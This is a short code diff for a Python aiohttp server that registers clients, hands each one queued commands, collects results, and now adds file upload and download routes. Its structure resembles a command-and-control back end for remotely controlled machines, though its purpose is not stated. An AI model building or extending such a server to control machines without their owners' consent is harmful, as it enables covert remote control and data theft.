@@ -9,7 +9,11 @@ import os
 clients = {}
 commands = {}
 
-async def register_client(request): #client is registered and now is recognized by the server
+UPLOAD_DIR = "uploads"
+if not os.path.exists(UPLOAD_DIR):
+    os.makedirs(UPLOAD_DIR)
+
+async def register_client(request):
     """Registers a new client."""
     data = await request.json()
     client_id = data.get("client_id")
@@ -113,7 +117,9 @@ app.add_routes([
     web.get("/command/{client_id}", get_command),
     web.post("/result", post_result),
     web.post("/issue_command", issue_command),
-    web.post("/upload_file", upload_file)
+    web.post("/upload_file", upload_file),
+    web.post("/upload", upload_file),  # Add this route for file upload
+    web.get("/download/{filename}", download_file)  # Add this route for file download
 ])
 
 if __name__ == "__main__":
